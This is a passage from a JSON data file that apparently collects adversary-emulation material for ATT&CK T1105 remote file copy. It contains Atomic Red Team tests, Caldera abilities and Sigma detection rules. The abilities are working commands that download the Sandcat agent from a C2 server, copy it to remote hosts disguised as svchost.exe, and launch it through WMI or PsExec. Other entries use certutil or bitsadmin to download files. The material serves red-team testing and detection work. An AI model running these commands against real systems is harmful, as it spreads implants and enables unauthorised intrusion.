\\\\localhost\\C$\necho var fileObject = WScript.createobject(\"Scripting.FileSystemObject\");var newfile = fileObject.CreateTextFile(\"AtomicTestFileT1105.js\", true);newfile.WriteLine(\"This is an atomic red team test file for T1105. It simulates how OSTap worms accross network shares and drives.\");newfile.Close(); > AtomicTestT1105.js\nCScript.exe AtomicTestT1105.js //E:JScript\ndel AtomicTestT1105.js /Q >nul 2>&1\ndel AtomicTestFileT1105.js /Q >nul 2>&1\npopd\n", "name": null}, {"source": "data/abilities/lateral-movement/3734aa1e-c536-42b3-8912-4c91b8bdce90.yml", "command": {"windows": {"psh": {"command": "$server=\"#{server}\";\n$sharePath=\"#{share}\";\nSet-Location $sharePath;$url=\"$($server)/file/download\";\n$wc=New-Object System.Net.WebClient;$wc.Headers.add(\"platform\",\"windows\");\n$wc.Headers.add(\"file\",\"sandcat.go\");($data=$wc.DownloadData($url)) -and\n($name=$wc.ResponseHeaders[\"Content-Disposition\"].Substring($wc.ResponseHeaders[\"Content-Disposition\"].IndexOf(\"filename=\")+9).Replace(\"`\"\",\"\"))\n-and ([io.file]::WriteAllBytes(\"$($sharePath)$name.exe\",$data));\n$startServer=\"$($sharePath)$name.exe -server $($server) \";Invoke-Command\n-ScriptBlock {Param([string]$startServer, $sharePath, $name, $server)  Invoke-WmiMethod\n-Class Win32_Process -Name Create -ArgumentList \"$($sharePath)$name.exe\n-server $server -v\" } -ComputerName #{remote.host.name} -ArgumentList $startServer, $sharePath, $name, $server\n", "cleanup": "del sandcat.go-windows; Invoke-Command -ComputerName", "payloads": ["sandcat.go-windows"]}}}, "name": "Copy Sandcat file using PowerShell"}, {"source": "data/abilities/lateral-movement/4908fdc4-74fc-4d7c-8935-26d11ad26a8d.yml", "command": {"windows": {"psh,pwsh": {"command": "$job = Start-Job -ScriptBlock {\n  $username = \"#{domain.user.name}\";\n  $password = \"#{domain.user.password}\";\n  $secstr = New-Object -TypeName System.Security.SecureString;\n  $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)};\n  $cred = New-Object -Typename System.Management.Automation.PSCredential -Argumentlist $username, $secstr;\n  $session = New-PSSession -ComputerName \"#{remote.host.name}\" -Credential $cred;\n  $location = \"#{location}\";\n  $exe = \"#{exe_name}\";\n  Copy-Item $location.replace($exe, \"sandcat.go-windows\") -Destination \"C:\\Users\\Public\\svchost.exe\" -ToSession $session;\n  Start-Sleep -s 5;\n  Remove-PSSession -Session $session;\n};\nReceive-Job -Job $job -Wait;\n", "cleanup": "$job = Start-Job -ScriptBlock {\n  $username = \"#{domain.user.name}\";\n  $password = \"#{domain.user.password}\";\n  $secstr = New-Object -TypeName System.Security.SecureString;\n  $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)};\n  $cred = New-Object -Typename System.Management.Automation.PSCredential -Argumentlist $username, $secstr;\n  $session = New-PSSession -ComputerName \"#{remote.host.name}\" -Credential $cred;\n  Invoke-Command -Session $session -Command {Remove-Item \"C:\\Users\\Public\\svchost.exe\" -force};\n  Start-Sleep -s 5;\n  Remove-PSSession -Session $session;\n};\nReceive-Job -Job $job -Wait;\n", "payloads": ["sandcat.go-windows"]}}, "darwin": {"sh": {"command": "scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-darwin #{remote.ssh.cmd}:~/sandcat.go\n", "cleanup": "ssh -o ConnectTimeout=3 #{remote.ssh.cmd} 'rm -f sandcat.go'\n", "payloads": ["sandcat.go-darwin"]}}, "linux": {"sh": {"command": "scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux #{remote.ssh.cmd}:~/sandcat.go\n", "cleanup": "ssh -o ConnectTimeout=3 -o StrictHostKeyChecking=no #{remote.ssh.cmd} 'rm -f sandcat.go'\n", "payloads": ["sandcat.go-linux"]}}}, "name": "Copy 54ndc47 to remote host (powershell 5 or newer only) or SCP"}, {"source": "data/abilities/lateral-movement/620b674a-7655-436c-b645-bc3e8ea51abd.yml", "command": {"windows": {"cmd": {"cleanup": "del /f sandcat.go-windows && del /f \\\\#{remote.host.name}\\Users\\Public\\sandcat.go-windows.exe", "command": "net /y use \\\\#{remote.host.name} & copy /y sandcat.go-windows\n\\\\#{remote.host.name}\\Users\\Public & #{psexec.path} -accepteula \\\\#{remote.host.name}\ncmd /c start C:\\Users\\Public\\sandcat.go-windows -server #{server} -v\n", "payloads": ["sandcat.go-windows"]}}}, "name": "Copy Sandcat file using PsExec on CMD"}, {"source": "data/abilities/lateral-movement/65048ec1-f7ca-49d3-9410-10813e472b30.yml", "command": {"windows": {"psh": {"command": "$path = \"sandcat.go-windows\";\n$drive = \"\\\\#{remote.host.fqdn}\\C$\";\nCopy-Item -v -Path $path -Destination $drive\"\\Users\\Public\\svchost.exe\";\n", "cleanup": "$drive = \"\\\\#{remote.host.fqdn}\\C$\";\nRemove-Item -Path $drive\"\\Users\\Public\\svchost.exe\" -Force;\n", "parsers": {"plugins.stockpile.app.parsers.54ndc47_remote_copy": [{"source": "remote.host.fqdn", "edge": "has_54ndc47_copy"}]}, "payloads": ["sandcat.go-windows"]}}}, "name": "Copy 54ndc47 to remote host (SMB)"}], "parsed_datasets": [{"Atomic Red Team Test - Remote File Copy": {"attack_technique": "T1105", "display_name": "Remote File Copy", "atomic_tests": [{"name": "rsync remote file copy (push)", "description": "Utilize rsync to perform a remote file copy (push)\n", "supported_platforms": ["linux", "macos"], "input_arguments": {"local_path": {"description": "Path of folder to copy", "type": "Path", "default": "/tmp/adversary-rsync/"}, "username": {"description": "User account to authenticate on remote host", "type": "String", "default": "victim"}, "remote_host": {"description": "Remote host to copy toward", "type": "String", "default": "victim-host"}, "remote_path": {"description": "Remote path to receive rsync", "type": "Path", "default": "/tmp/victim-files"}}, "executor": {"name": "bash", "command": "rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}\n"}}, {"name": "rsync remote file copy (pull)", "description": "Utilize rsync to perform a remote file copy (pull)\n", "supported_platforms": ["linux", "macos"], "input_arguments": {"remote_path": {"description": "Path of folder to copy", "type": "Path", "default": "/tmp/adversary-rsync/"}, "username": {"description": "User account to authenticate on remote host", "type": "String", "default": "adversary"}, "remote_host": {"description": "Remote host to copy from", "type": "String", "default": "adversary-host"}, "local_path": {"description": "Local path to receive rsync", "type": "Path", "default": "/tmp/victim-files"}}, "executor": {"name": "bash", "command": "rsync -r #{username}@#{remote_host}:#{remote_path} #{local_path}\n"}}, {"name": "scp remote file copy (push)", "description": "Utilize scp to perform a remote file copy (push)\n", "supported_platforms": ["linux", "macos"], "input_arguments": {"local_file": {"description": "Path of file to copy", "type": "Path", "default": "/tmp/adversary-scp"}, "username": {"description": "User account to authenticate on remote host", "type": "String", "default": "victim"}, "remote_host": {"description": "Remote host to copy toward", "type": "String", "default": "victim-host"}, "remote_path": {"description": "Remote path to receive scp", "type": "Path", "default": "/tmp/victim-files/"}}, "executor": {"name": "bash", "command": "scp #{local_file} #{username}@#{remote_host}:#{remote_path}\n"}}, {"name": "scp remote file copy (pull)", "description": "Utilize scp to perform a remote file copy (pull)\n", "supported_platforms": ["linux", "macos"], "input_arguments": {"remote_file": {"description": "Path of file to copy", "type": "Path", "default": "/tmp/adversary-scp"}, "username": {"description": "User account to authenticate on remote host", "type": "String", "default": "adversary"}, "remote_host": {"description": "Remote host to copy from", "type": "String", "default": "adversary-host"}, "local_path": {"description": "Local path to receive scp", "type": "Path", "default": "/tmp/victim-files/"}}, "executor": {"name": "bash", "command": "scp #{username}@#{remote_host}:#{remote_file} #{local_path}\n"}}, {"name": "sftp remote file copy (push)", "description": "Utilize sftp to perform a remote file copy (push)\n", "supported_platforms": ["linux", "macos"], "input_arguments": {"local_file": {"description": "Path of file to copy", "type": "Path", "default": "/tmp/adversary-sftp"}, "username": {"description": "User account to authenticate on remote host", "type": "String", "default": "victim"}, "remote_host": {"description": "Remote host to copy toward", "type": "String", "default": "victim-host"}, "remote_path": {"description": "Remote path to receive sftp", "type": "Path", "default": "/tmp/victim-files/"}}, "executor": {"name": "bash", "command": "sftp #{username}@#{remote_host}:#{remote_path} <<< $'put #{local_file}'\n"}}, {"name": "sftp remote file copy (pull)", "description": "Utilize sftp to perform a remote file copy (pull)\n", "supported_platforms": ["linux", "macos"], "input_arguments": {"remote_file": {"description": "Path of file to copy", "type": "Path", "default": "/tmp/adversary-sftp"}, "username": {"description": "User account to authenticate on remote host", "type": "String", "default": "adversary"}, "remote_host": {"description": "Remote host to copy from", "type": "String", "default": "adversary-host"}, "local_path": {"description": "Local path to receive sftp", "type": "Path", "default": "/tmp/victim-files/"}}, "executor": {"name": "bash", "command": "sftp #{username}@#{remote_host}:#{remote_file} #{local_path}\n"}}, {"name": "certutil download (urlcache)", "description": "Use certutil -urlcache argument to download a file from the web. Note - /urlcache also works!\n", "supported_platforms": ["windows"], "input_arguments": {"remote_file": {"description": "URL of file to copy", "type": "Url", "default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt"}, "local_path": {"description": "Local path to place file", "type": "Path", "default": "Atomic-license.txt"}}, "executor": {"name": "command_prompt", "elevation_required": false, "command": "cmd /c certutil -urlcache -split -f #{remote_file} #{local_path}\n"}}, {"name": "certutil download (verifyctl)", "description": "Use certutil -verifyctl argument to download a file from the web. Note - /verifyctl also works!\n", "supported_platforms": ["windows"], "input_arguments": {"remote_file": {"description": "URL of file to copy", "type": "Url", "default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt"}, "local_path": {"description": "Local path to place file", "type": "Path", "default": "Atomic-license.txt"}}, "executor": {"name": "powershell", "elevation_required": false, "command": "$datePath = \"certutil-$(Get-Date -format yyyy_MM_dd_HH_mm)\"\nNew-Item -Path $datePath -ItemType Directory\nSet-Location $datePath\ncertutil -verifyctl -split -f #{remote_file}\nGet-ChildItem | Where-Object {$_.Name -notlike \"*.txt\"} | Foreach-Object { Move-Item $_.Name -Destination #{local_path} }\n"}}, {"name": "Windows - BITSAdmin BITS Download", "description": "This test uses BITSAdmin.exe to schedule a BITS job for the download of a file.\nThis technique is used by Qbot malware to download payloads.\n", "supported_platforms": ["windows"], "input_arguments": {"bits_job_name": {"description": "Name of the created BITS job", "type": "String", "default": "qcxjb7"}, "remote_file": {"description": "URL of file to copy", "type": "Url", "default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt"}, "local_path": {"description": "Local path to place file", "type": "Path", "default": "Atomic-license.txt"}}, "executor": {"name": "command_prompt", "command": "C:\\Windows\\System32\\bitsadmin.exe /transfer #{bits_job_name} /Priority HIGH #{remote_file} #{local_path}\n"}}, {"name": "Windows - PowerShell Download", "description": "This test uses PowerShell to download a payload.\nThis technique is used by multiple adversaries and malware families.\n", "supported_platforms": ["windows"], "input_arguments": {"remote_file": {"description": "URL of file to copy", "type": "Url", "default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt"}, "destination_path": {"description": "Destination path to file", "type": "Path", "default": "$env:TEMP\\Atomic-license.txt"}}, "executor": {"name": "powershell", "command": "(New-Object System.Net.WebClient).DownloadFile(\"#{remote_file}\", \"#{destination_path}\")\n", "cleanup_command": "Remove-Item #{destination_path} -Force -ErrorAction Ignore\n"}}, {"name": "OSTAP Worming Activity", "description": "OSTap copies itself in a specfic way to shares and secondary drives. This emulates the activity.\n", "supported_platforms": ["windows"], "input_arguments": {"destination_path": {"description": "Path to create remote file at. Default is local admin share.", "type": "String", "default": "\\\\localhost\\C$"}}, "executor": {"name": "command_prompt", "elevation_required": true, "command": "pushd #{destination_path}\necho var fileObject = WScript.createobject(\"Scripting.FileSystemObject\");var newfile = fileObject.CreateTextFile(\"AtomicTestFileT1105.js\", true);newfile.WriteLine(\"This is an atomic red team test file for T1105. It simulates how OSTap worms accross network shares and drives.\");newfile.Close(); > AtomicTestT1105.js\nCScript.exe AtomicTestT1105.js //E:JScript\ndel AtomicTestT1105.js /Q >nul 2>&1\ndel AtomicTestFileT1105.js /Q >nul 2>&1\npopd\n"}}]}}, {"Mitre Stockpile - Copy Sandcat file using PowerShell": {"id": "3734aa1e-c536-42b3-8912-4c91b8bdce90", "description": "Copy Sandcat file using PowerShell", "name": "Copy Sandcat File using Powershell", "tactic": "lateral-movement", "technique": {"attack_id": "T1105", "name": "Remote File Copy"}, "platforms": {"windows": {"psh": {"command": "$server=\"#{server}\";\n$sharePath=\"#{share}\";\nSet-Location $sharePath;$url=\"$($server)/file/download\";\n$wc=New-Object System.Net.WebClient;$wc.Headers.add(\"platform\",\"windows\");\n$wc.Headers.add(\"file\",\"sandcat.go\");($data=$wc.DownloadData($url)) -and\n($name=$wc.ResponseHeaders[\"Content-Disposition\"].Substring($wc.ResponseHeaders[\"Content-Disposition\"].IndexOf(\"filename=\")+9).Replace(\"`\"\",\"\"))\n-and ([io.file]::WriteAllBytes(\"$($sharePath)$name.exe\",$data));\n$startServer=\"$($sharePath)$name.exe -server $($server) \";Invoke-Command\n-ScriptBlock {Param([string]$startServer, $sharePath, $name, $server)  Invoke-WmiMethod\n-Class Win32_Process -Name Create -ArgumentList \"$($sharePath)$name.exe\n-server $server -v\" } -ComputerName #{remote.host.name} -ArgumentList $startServer, $sharePath, $name, $server\n", "cleanup": "del sandcat.go-windows; Invoke-Command -ComputerName", "payloads": ["sandcat.go-windows"]}}}}}, {"Mitre Stockpile - Copy 54ndc47 to remote host (powershell 5 or newer only) or SCP": {"id": "4908fdc4-74fc-4d7c-8935-26d11ad26a8d", "name": "Copy 54ndc47 (WinRM and SCP)", "description": "Copy 54ndc47 to remote host (powershell 5 or newer only) or SCP", "tactic": "lateral-movement", "technique": {"attack_id": "T1105", "name": "Remote File Copy"}, "platforms": {"windows": {"psh,pwsh": {"command": "$job = Start-Job -ScriptBlock {\n  $username = \"#{domain.user.name}\";\n  $password = \"#{domain.user.password}\";\n  $secstr = New-Object -TypeName System.Security.SecureString;\n  $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)};\n  $cred = New-Object -Typename System.Management.Automation.PSCredential -Argumentlist $username, $secstr;\n  $session = New-PSSession -ComputerName \"#{remote.host.name}\" -Credential $cred;\n  $location = \"#{location}\";\n  $exe = \"#{exe_name}\";\n  Copy-Item $location.replace($exe, \"sandcat.go-windows\") -Destination \"C:\\Users\\Public\\svchost.exe\" -ToSession $session;\n  Start-Sleep -s 5;\n  Remove-PSSession -Session $session;\n};\nReceive-Job -Job $job -Wait;\n", "cleanup": "$job = Start-Job -ScriptBlock {\n  $username = \"#{domain.user.name}\";\n  $password = \"#{domain.user.password}\";\n  $secstr = New-Object -TypeName System.Security.SecureString;\n  $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)};\n  $cred = New-Object -Typename System.Management.Automation.PSCredential -Argumentlist $username, $secstr;\n  $session = New-PSSession -ComputerName \"#{remote.host.name}\" -Credential $cred;\n  Invoke-Command -Session $session -Command {Remove-Item \"C:\\Users\\Public\\svchost.exe\" -force};\n  Start-Sleep -s 5;\n  Remove-PSSession -Session $session;\n};\nReceive-Job -Job $job -Wait;\n", "payloads": ["sandcat.go-windows"]}}, "darwin": {"sh": {"command": "scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-darwin #{remote.ssh.cmd}:~/sandcat.go\n", "cleanup": "ssh -o ConnectTimeout=3 #{remote.ssh.cmd} 'rm -f sandcat.go'\n", "payloads": ["sandcat.go-darwin"]}}, "linux": {"sh": {"command": "scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux #{remote.ssh.cmd}:~/sandcat.go\n", "cleanup": "ssh -o ConnectTimeout=3 -o StrictHostKeyChecking=no #{remote.ssh.cmd} 'rm -f sandcat.go'\n", "payloads": ["sandcat.go-linux"]}}}}}, {"Mitre Stockpile - Copy Sandcat file using PsExec on CMD": {"id": "620b674a-7655-436c-b645-bc3e8ea51abd", "description": "Copy Sandcat file using PsExec on CMD", "name": "Copy Sandcat File using PsExec on CMD", "tactic": "lateral-movement", "technique": {"attack_id": "T1105", "name": "Remote File Copy"}, "platforms": {"windows": {"cmd": {"cleanup": "del /f sandcat.go-windows && del /f \\\\#{remote.host.name}\\Users\\Public\\sandcat.go-windows.exe", "command": "net /y use \\\\#{remote.host.name} & copy /y sandcat.go-windows\n\\\\#{remote.host.name}\\Users\\Public & #{psexec.path} -accepteula \\\\#{remote.host.name}\ncmd /c start C:\\Users\\Public\\sandcat.go-windows -server #{server} -v\n", "payloads": ["sandcat.go-windows"]}}}}}, {"Mitre Stockpile - Copy 54ndc47 to remote host (SMB)": {"id": "65048ec1-f7ca-49d3-9410-10813e472b30", "name": "Copy 54ndc47 (SMB)", "description": "Copy 54ndc47 to remote host (SMB)", "tactic": "lateral-movement", "technique": {"attack_id": "T1105", "name": "Remote File Copy"}, "platforms": {"windows": {"psh": {"command": "$path = \"sandcat.go-windows\";\n$drive = \"\\\\#{remote.host.fqdn}\\C$\";\nCopy-Item -v -Path $path -Destination $drive\"\\Users\\Public\\svchost.exe\";\n", "cleanup": "$drive = \"\\\\#{remote.host.fqdn}\\C$\";\nRemove-Item -Path $drive\"\\Users\\Public\\svchost.exe\" -Force;\n", "parsers": {"plugins.stockpile.app.parsers.54ndc47_remote_copy": [{"source": "remote.host.fqdn", "edge": "has_54ndc47_copy"}]}, "payloads": ["sandcat.go-windows"]}}}, "requirements": [{"plugins.stockpile.app.requirements.not_exists": [{"source": "remote.host.fqdn", "edge": "has_54ndc47_copy"}]}, {"plugins.stockpile.app.requirements.basic": [{"source": "remote.host.fqdn", "edge": "has_share"}]}, {"plugins.stockpile.app.requirements.no_backwards_movement": [{"source": "remote.host.fqdn"}]}]}}], "command_list": ["rsync -r /tmp/adversary-rsync/ #{username}@#{remote_host}:#{remote_path}\n", "rsync -r #{local_path} victim@#{remote_host}:#{remote_path}\n", "rsync -r #{local_path} #{username}@victim-host:#{remote_path}\n", "rsync -r #{local_path} #{username}@#{remote_host}:/tmp/victim-files\n", "rsync -r #{username}@#{remote_host}:/tmp/adversary-rsync/ #{local_path}\n", "rsync -r adversary@#{remote_host}:#{remote_path} #{local_path}\n", "rsync -r #{username}@adversary-host:#{remote_path} #{local_path}\n", "rsync -r #{username}@#{remote_host}:#{remote_path} /tmp/victim-files\n", "scp /tmp/adversary-scp #{username}@#{remote_host}:#{remote_path}\n", "scp #{local_file} victim@#{remote_host}:#{remote_path}\n", "scp #{local_file} #{username}@victim-host:#{remote_path}\n", "scp #{local_file} #{username}@#{remote_host}:/tmp/victim-files/\n", "scp #{username}@#{remote_host}:/tmp/adversary-scp #{local_path}\n", "scp adversary@#{remote_host}:#{remote_file} #{local_path}\n", "scp #{username}@adversary-host:#{remote_file} #{local_path}\n", "scp #{username}@#{remote_host}:#{remote_file} /tmp/victim-files/\n", "sftp #{username}@#{remote_host}:#{remote_path} <<< $'put /tmp/adversary-sftp'\n", "sftp victim@#{remote_host}:#{remote_path} <<< $'put #{local_file}'\n", "sftp #{username}@victim-host:#{remote_path} <<< $'put #{local_file}'\n", "sftp #{username}@#{remote_host}:/tmp/victim-files/ <<< $'put #{local_file}'\n", "sftp #{username}@#{remote_host}:/tmp/adversary-sftp #{local_path}\n", "sftp adversary@#{remote_host}:#{remote_file} #{local_path}\n", "sftp #{username}@adversary-host:#{remote_file} #{local_path}\n", "sftp #{username}@#{remote_host}:#{remote_file} /tmp/victim-files/\n", "cmd /c certutil -urlcache -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt #{local_path}\n", "cmd /c certutil -urlcache -split -f #{remote_file} Atomic-license.txt\n", "$datePath = \"certutil-$(Get-Date -format yyyy_MM_dd_HH_mm)\"\nNew-Item -Path $datePath -ItemType Directory\nSet-Location $datePath\ncertutil -verifyctl -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt\nGet-ChildItem | Where-Object {$_.Name -notlike \"*.txt\"} | Foreach-Object { Move-Item $_.Name -Destination #{local_path} }\n", "$datePath = \"certutil-$(Get-Date -format yyyy_MM_dd_HH_mm)\"\nNew-Item -Path $datePath -ItemType Directory\nSet-Location $datePath\ncertutil -verifyctl -split -f #{remote_file}\nGet-ChildItem | Where-Object {$_.Name -notlike \"*.txt\"} | Foreach-Object { Move-Item $_.Name -Destination Atomic-license.txt }\n", "C:\\Windows\\System32\\bitsadmin.exe /transfer qcxjb7 /Priority HIGH #{remote_file} #{local_path}\n", "C:\\Windows\\System32\\bitsadmin.exe /transfer #{bits_job_name} /Priority HIGH https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt #{local_path}\n", "C:\\Windows\\System32\\bitsadmin.exe /transfer #{bits_job_name} /Priority HIGH #{remote_file} Atomic-license.txt\n", "(New-Object System.Net.WebClient).DownloadFile(\"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt\", \"#{destination_path}\")\n", "(New-Object System.Net.WebClient).DownloadFile(\"#{remote_file}\", \"$env:TEMP\\Atomic-license.txt\")\n", "pushd \\\\localhost\\C$\necho var fileObject = WScript.createobject(\"Scripting.FileSystemObject\");var newfile = fileObject.CreateTextFile(\"AtomicTestFileT1105.js\", true);newfile.WriteLine(\"This is an atomic red team test file for T1105. It simulates how OSTap worms accross network shares and drives.\");newfile.Close(); > AtomicTestT1105.js\nCScript.exe AtomicTestT1105.js //E:JScript\ndel AtomicTestT1105.js /Q >nul 2>&1\ndel AtomicTestFileT1105.js /Q >nul 2>&1\npopd\n", {"windows": {"psh": {"command": "$server=\"#{server}\";\n$sharePath=\"#{share}\";\nSet-Location $sharePath;$url=\"$($server)/file/download\";\n$wc=New-Object System.Net.WebClient;$wc.Headers.add(\"platform\",\"windows\");\n$wc.Headers.add(\"file\",\"sandcat.go\");($data=$wc.DownloadData($url)) -and\n($name=$wc.ResponseHeaders[\"Content-Disposition\"].Substring($wc.ResponseHeaders[\"Content-Disposition\"].IndexOf(\"filename=\")+9).Replace(\"`\"\",\"\"))\n-and ([io.file]::WriteAllBytes(\"$($sharePath)$name.exe\",$data));\n$startServer=\"$($sharePath)$name.exe -server $($server) \";Invoke-Command\n-ScriptBlock {Param([string]$startServer, $sharePath, $name, $server)  Invoke-WmiMethod\n-Class Win32_Process -Name Create -ArgumentList \"$($sharePath)$name.exe\n-server $server -v\" } -ComputerName #{remote.host.name} -ArgumentList $startServer, $sharePath, $name, $server\n", "cleanup": "del sandcat.go-windows; Invoke-Command -ComputerName", "payloads": ["sandcat.go-windows"]}}}, {"windows": {"psh,pwsh": {"command": "$job = Start-Job -ScriptBlock {\n  $username = \"#{domain.user.name}\";\n  $password = \"#{domain.user.password}\";\n  $secstr = New-Object -TypeName System.Security.SecureString;\n  $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)};\n  $cred = New-Object -Typename System.Management.Automation.PSCredential -Argumentlist $username, $secstr;\n  $session = New-PSSession -ComputerName \"#{remote.host.name}\" -Credential $cred;\n  $location = \"#{location}\";\n  $exe = \"#{exe_name}\";\n  Copy-Item $location.replace($exe, \"sandcat.go-windows\") -Destination \"C:\\Users\\Public\\svchost.exe\" -ToSession $session;\n  Start-Sleep -s 5;\n  Remove-PSSession -Session $session;\n};\nReceive-Job -Job $job -Wait;\n", "cleanup": "$job = Start-Job -ScriptBlock {\n  $username = \"#{domain.user.name}\";\n  $password = \"#{domain.user.password}\";\n  $secstr = New-Object -TypeName System.Security.SecureString;\n  $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)};\n  $cred = New-Object -Typename System.Management.Automation.PSCredential -Argumentlist $username, $secstr;\n  $session = New-PSSession -ComputerName \"#{remote.host.name}\" -Credential $cred;\n  Invoke-Command -Session $session -Command {Remove-Item \"C:\\Users\\Public\\svchost.exe\" -force};\n  Start-Sleep -s 5;\n  Remove-PSSession -Session $session;\n};\nReceive-Job -Job $job -Wait;\n", "payloads": ["sandcat.go-windows"]}}, "darwin": {"sh": {"command": "scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-darwin #{remote.ssh.cmd}:~/sandcat.go\n", "cleanup": "ssh -o ConnectTimeout=3 #{remote.ssh.cmd} 'rm -f sandcat.go'\n", "payloads": ["sandcat.go-darwin"]}}, "linux": {"sh": {"command": "scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux #{remote.ssh.cmd}:~/sandcat.go\n", "cleanup": "ssh -o ConnectTimeout=3 -o StrictHostKeyChecking=no #{remote.ssh.cmd} 'rm -f sandcat.go'\n", "payloads": ["sandcat.go-linux"]}}}, {"windows": {"cmd": {"cleanup": "del /f sandcat.go-windows && del /f \\\\#{remote.host.name}\\Users\\Public\\sandcat.go-windows.exe", "command": "net /y use \\\\#{remote.host.name} & copy /y sandcat.go-windows\n\\\\#{remote.host.name}\\Users\\Public & #{psexec.path} -accepteula \\\\#{remote.host.name}\ncmd /c start C:\\Users\\Public\\sandcat.go-windows -server #{server} -v\n", "payloads": ["sandcat.go-windows"]}}}, {"windows": {"psh": {"command": "$path = \"sandcat.go-windows\";\n$drive = \"\\\\#{remote.host.fqdn}\\C$\";\nCopy-Item -v -Path $path -Destination $drive\"\\Users\\Public\\svchost.exe\";\n", "cleanup": "$drive = \"\\\\#{remote.host.fqdn}\\C$\";\nRemove-Item -Path $drive\"\\Users\\Public\\svchost.exe\" -Force;\n", "parsers": {"plugins.stockpile.app.parsers.54ndc47_remote_copy": [{"source": "remote.host.fqdn", "edge": "has_54ndc47_copy"}]}, "payloads": ["sandcat.go-windows"]}}}], "attack_paths": [], "queries": [], "possible_detections": [{"data_source": {"action": "global", "title": "Pandemic Registry Key", "id": "47e0852a-cf81-4494-a8e6-31864f8c86ed", "status": "experimental", "description": "Detects Pandemic Windows Implant", "references": ["https://wikileaks.org/vault7/#Pandemic", "https://twitter.com/MalwareJake/status/870349480356454401"], "tags": ["attack.lateral_movement", "attack.t1105"], "author": "Florian Roth", "detection": {"condition": "1 of them"}, "fields": ["EventID", "CommandLine", "ParentCommandLine", "Image", "User", "TargetObject"], "falsepositives": ["unknown"], "level": "critical"}}, {"data_source": {"logsource": {"product": "windows", "service": "sysmon"}, "detection": {"selection1": {"EventID": 13, "TargetObject": ["\\REGISTRY\\MACHINE\\SYSTEM\\CurrentControlSet\\services\\null\\Instance*", "\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\services\\null\\Instance*", "\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet002\\services\\null\\Instance*"]}}}}, {"data_source": {"logsource": {"category": "process_creation", "product": "windows"}, "detection": {"selection2": {"Command": "loaddll -a *"}}}}, {"data_source": {"title": "Microsoft Binary Github Communication", "id": "635dbb88-67b3-4b41-9ea5-a3af2dd88153", "status": "experimental", "description": "Detects an executable in the Windows folder accessing github.com", "references": ["https://twitter.com/M_haggis/status/900741347035889665", "https://twitter.com/M_haggis/status/1032799638213066752"], "author": "Michael Haag (idea), Florian Roth (rule)", "tags": ["attack.lateral_movement", "attack.t1105"], "logsource": {"product": "windows", "service": "sysmon"}, "detection": {"selection": {"EventID": 3, "Initiated": "true", "DestinationHostname": ["*.github.com", "*.githubusercontent.com"], "Image": "C:\\Windows\\\\*"}, "condition": "selection"}, "falsepositives": ["Unknown", "@subTee in your network"], "level": "high"}}, {"data_source": {"title": "Microsoft Binary Suspicious Communication Endpoint", "id": "e0f8ab85-0ac9-423b-a73a-81b3c7b1aa97", "status": "experimental", "description": "Detects an executable in the Windows folder accessing suspicious domains", "references": ["https://twitter.com/M_haggis/status/900741347035889665", "https://twitter.com/M_haggis/status/1032799638213066752"], "author": "Florian Roth", "date": "2018/08/30", "tags": ["attack.lateral_movement", "attack.t1105"], "logsource": {"product": "windows", "service": "sysmon"}, "detection": {"selection": {"EventID": 3, "Initiated": "true", "DestinationHostname": ["*dl.dropboxusercontent.com", "*.pastebin.com", "*.githubusercontent.com"], "Image": "C:\\Windows\\\\*"}, "condition": "selection"}, "falsepositives": ["Unknown"], "level": "high"}}, {"data_source": {"title": "Suspicious Certutil Command", "id": "e011a729-98a6-4139-b5c4-bf6f6dd8239a", "status": "experimental", "description": "Detects a suspicious Microsoft certutil execution with sub commands like 'decode' sub command, which is sometimes used to decode malicious code with the built-in certutil utility", "author": "Florian Roth, juju4, keepwatch", "modified": "2019/01/22", "references": ["https://twitter.com/JohnLaTwC/status/835149808817991680", "https://twitter.com/subTee/status/888102593838362624", "https://twitter.com/subTee/status/888071631528235010", "https://blogs.technet.microsoft.com/pki/2006/11/30/basic-crl-checking-with-certutil/", "https://www.trustedsec.com/2017/07/new-tool-release-nps_payload/", "https://twitter.com/egre55/status/1087685529016193025", "https://lolbas-project.github.io/lolbas/Binaries/Certutil/"], "logsource": {"category": "process_creation", "product": "windows"}, "detection": {"selection": {"CommandLine": ["* -decode *", "* /decode *", "* -decodehex *", "* /decodehex *", "* -urlcache *", "* /urlcache *", "* -verifyctl *", "* /verifyctl *", "* -encode *", "* /encode *", "*certutil* -URL*", "*certutil* /URL*", "*certutil* -ping*", "*certutil* /ping*"]}, "condition": "selection"}, "fields": ["CommandLine", "ParentCommandLine"], "tags": ["attack.defense_evasion", "attack.t1140", "attack.t1105", "attack.s0189", "attack.g0007"], "falsepositives": ["False positives depend on scripts and administrative tools used in the monitored environment"], "level": "high"}}, {"data_source": {"title": "Malicious payload download via Office binaries", "id": "0c79148b-118e-472b-bdb7-9b57b444cc19", "status": "experimental", "description": "Downloads payload from remote server", "references": ["https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Powerpnt.yml", 